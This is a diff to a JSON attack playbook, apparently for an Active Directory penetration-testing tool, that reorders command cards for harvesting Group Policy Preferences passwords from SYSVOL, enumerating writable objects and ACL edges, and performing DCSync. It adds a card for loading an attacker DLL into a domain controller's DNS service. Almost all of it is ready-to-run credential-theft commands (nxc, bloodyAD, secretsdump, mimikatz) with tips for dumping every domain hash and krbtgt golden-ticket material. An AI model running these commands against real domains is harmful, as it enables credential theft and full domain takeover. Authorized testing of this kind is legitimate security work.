@@ -562,7 +562,7 @@
       "id": "gpp-passwords",
       "title": "GPP Passwords in SYSVOL",
       "hypothesis": "Old Group Policy Preferences saved local-account passwords inside XML files under SYSVOL, a share readable by any domain user, and sometimes by anonymous sessions. The cpassword field is AES-encrypted with a key Microsoft disclosed publicly in 2012, so it is essentially cleartext. SYSVOL commonly stores scripts and config files carrying other secrets as well.",
-      "tool": "smbclient",
+      "tool": "nxc",
       "tools": [
         "nxc",
         "smbclient",
@@ -591,19 +591,24 @@
       "refs": [],
       "commands": [
         {
-          "tool": "smbclient",
-          "run": "smbclient '//{{target}}/SYSVOL' -N -c 'recurse; ls'",
-          "note": "Lead with the GPP-specific step: an anonymous recursive listing of SYSVOL. Look under Policies for Groups.xml, ScheduledTasks.xml, and Services.xml carrying a cpassword. (A plain share listing is the Anonymous SMB Enumeration move, this one goes straight for the GPP files.)"
-        },
-        {
-          "tool": "gpp-decrypt",
-          "run": "gpp-decrypt {{hash}}",
-          "note": "Pass the cpassword value as the argument. Because the AES key is public, this is instantaneous."
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u '{{user}}' -p '{{password}}' -M gpp_password",
+          "note": "PREFERRED, one remote shot from Kali: nxc spiders SYSVOL for Groups.xml/ScheduledTasks.xml/Services.xml, pulls every cpassword and decrypts it with the public AES key, no manual find-then-decrypt. Leave -u/-p empty ('' '') to try it anonymously first. Pair with -M gpp_autologin for autologon creds stashed in the Registry.xml under SYSVOL."
         },
         {
           "tool": "nxc",
           "run": "nxc smb {{target}} -u '' -p '' --shares",
-          "note": "Fallback: confirm SYSVOL/NETLOGON are readable with null authentication before recursing them for GPP files."
+          "note": "Readability pre-check: confirm SYSVOL/NETLOGON are reachable with null authentication before (or instead of) spidering them for GPP files."
+        },
+        {
+          "tool": "smbclient",
+          "run": "smbclient '//{{target}}/SYSVOL' -N -c 'recurse; ls'",
+          "note": "Manual fallback when the module misses a file: an anonymous recursive listing of SYSVOL. Look under Policies for Groups.xml, ScheduledTasks.xml, and Services.xml carrying a cpassword. (A plain share listing is the Anonymous SMB Enumeration move, this one goes straight for the GPP files.)"
+        },
+        {
+          "tool": "gpp-decrypt",
+          "run": "gpp-decrypt {{hash}}",
+          "note": "Manual decrypt of a cpassword you pulled by hand. Pass the cpassword value as the argument. Because the AES key is public, this is instantaneous."
         }
       ]
     },
@@ -931,16 +936,9 @@
       ],
       "commands": [
         {
-          "tool": "bloodyad",
-          "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail",
-          "web": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail | tee {{scandir}}/bloodyad-writable.txt",
-          "web_note": "In a large domain --detail can run to tens of thousands of lines, too many to paste. It writes to scans/bloodyad-writable.txt (shown); attach that file in Evidence, obol only needs the writable-object lines.",
-          "note": "LANE 1 (remote, no foothold): the single highest-signal question, what objects can THIS account write to? Every writable group/user/computer is a candidate edge (join a group, reset a password, add a shadow cred, grant DCSync). Start here."
-        },
-        {
           "tool": "nxc",
           "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --admin-count",
-          "note": "Privileged accounts (adminCount=1), the high-value targets a path must end at. Pair with --kerberoasting/--asreproast: a roastable admin is a one-step path."
+          "note": "LANE 1 (remote from Kali, no foothold) — start with nxc. Privileged accounts (adminCount=1), the high-value targets a path must end at. Pair with --kerberoasting/--asreproast: a roastable admin is a one-step path."
         },
         {
           "tool": "nxc",
@@ -961,6 +959,13 @@
           "tool": "nxc",
           "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' -M daclread -o TARGET='Domain Admins' ACTION=read",
           "note": "Who holds WriteDacl/GenericAll/WriteOwner over a high-value object, the ACL edges bloodyad-acl/ad-acl-abuse cash in. Point TARGET at the domain object (base DN) to find who can grant themselves DCSync."
+        },
+        {
+          "tool": "bloodyad",
+          "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail",
+          "web": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail | tee {{scandir}}/bloodyad-writable.txt",
+          "web_note": "In a large domain --detail can run to tens of thousands of lines, too many to paste. It writes to scans/bloodyad-writable.txt (shown); attach that file in Evidence, obol only needs the writable-object lines.",
+          "note": "LANE 1 companion to the nxc queries above (also remote, no foothold): the single highest-signal writable-objects question, what objects can THIS account write to? Every writable group/user/computer is a candidate edge (join a group, reset a password, add a shadow cred, grant DCSync). Reach for this when nxc's daclread needs a wider sweep."
         },
         {
           "tool": "ldapsearch",
@@ -1068,11 +1073,11 @@
       "id": "dcsync",
       "title": "DCSync",
       "hypothesis": "An account holding replication rights (GetChanges plus GetChangesAll, Domain Admins, and any account handed them through ACL abuse) can request that a DC replicate password data, with no logon to the DC needed. This is where most AD paths finish: abuse ACLs to award yourself replication rights, then sync.",
-      "tool": "impacket-secretsdump",
+      "tool": "nxc",
       "tools": [
+        "nxc",
         "impacket-secretsdump",
-        "mimikatz",
-        "nxc"
+        "mimikatz"
       ],
       "os": [
         "windows"
@@ -1099,9 +1104,14 @@
       ],
       "commands": [
         {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' --ntds",
+          "note": "PREFERRED cash-in, from Kali: the same DRSUAPI replication with the least typing, every hash in the domain, krbtgt among them (golden-ticket material). Append --ntds vss for the shadow-copy approach. PREREQUISITE if you got here via ACL abuse (not a Domain Admin): your account must ALREADY hold the two replication ACEs. Run the ACL move's `add dcsync <you>` card FIRST and re-authenticate, then this. rpc_s_access_denied or DRSR 0x20f7 (ERROR_DS_DRA_BAD_DN) means those rights are not on your account yet. ONE CAVEAT: on newer Windows nxc may prompt an interactive [Y/N] ('dumping the ntds can crash the DC') that stalls an unattended run, and has occasionally hit DRSR BAD_DN where impacket succeeds, if nxc stalls or errors, drop to the secretsdump fallback right below."
+        },
+        {
           "tool": "impacket-secretsdump",
           "run": "impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}} -just-dc",
-          "note": "PREFERRED cash-in: a full DRSUAPI sync, every hash in the domain, krbtgt among them (golden ticket material). -just-dc forces the replication path (no local SAM/LSA read first). No interactive prompt, no DC-side artifact. Guard this file; it is the report evidence itself. PREREQUISITE if you got here via ACL abuse (not a Domain Admin): your account must ALREADY hold the two replication ACEs. Run the ACL move's `add dcsync <you>` card FIRST and re-authenticate, then this. Getting rpc_s_access_denied or DRSR code 0x20f7 (ERROR_DS_DRA_BAD_DN) means those rights are not on your account yet, joining a WriteDACL group (e.g. Exchange Windows Permissions) only lets you GRANT them; it is not the grant itself."
+          "note": "Robust fallback for when nxc stalls on its [Y/N] prompt or hits DRSR BAD_DN: a full DRSUAPI sync, -just-dc forces the replication path (no local SAM/LSA read first). No interactive prompt, no DC-side artifact. Guard this file; it is the report evidence itself. Same ACL-abuse prerequisite as above."
         },
         {
           "tool": "impacket-secretsdump",
@@ -1111,12 +1121,7 @@
         {
           "tool": "mimikatz",
           "run": "lsadump::dcsync /domain:{{domain}} /user:{{domain}}\\administrator",
-          "note": "Replicates a single account from a Windows session. Use /all rather than /user for the entire database. The mimikatz session has to run as the account that holds the rights (a pth-spawned shell or token impersonation)."
-        },
-        {
-          "tool": "nxc",
-          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' --ntds",
-          "note": "Same DRSUAPI replication with less typing, BUT on newer Windows nxc prompts an interactive [Y/N] ('dumping the ntds can crash the DC') that STALLS an unattended run, and it has been seen to fail with DRSR ERROR_DS_DRA_BAD_DN where impacket-secretsdump succeeds, prefer secretsdump for DCSync. Append --ntds vss for the shadow-copy approach; krbtgt in the output means golden-ticket material."
+          "note": "On-host last resort (requires a Windows session as the rights-holder): replicates a single account. Use /all rather than /user for the entire database. The mimikatz session has to run as the account that holds the rights (a pth-spawned shell or token impersonation)."
         }
       ]
     },
@@ -2736,6 +2741,7 @@
       ],
       "autonomy": "approve",
       "priority": 84,
+      "sequence": true,
       "proves": "loads an attacker DLL into the DC's DNS service as SYSTEM",
       "does_not_prove": "access until the DNS service is restarted (needs the right or a wait/trigger)",
       "report": {
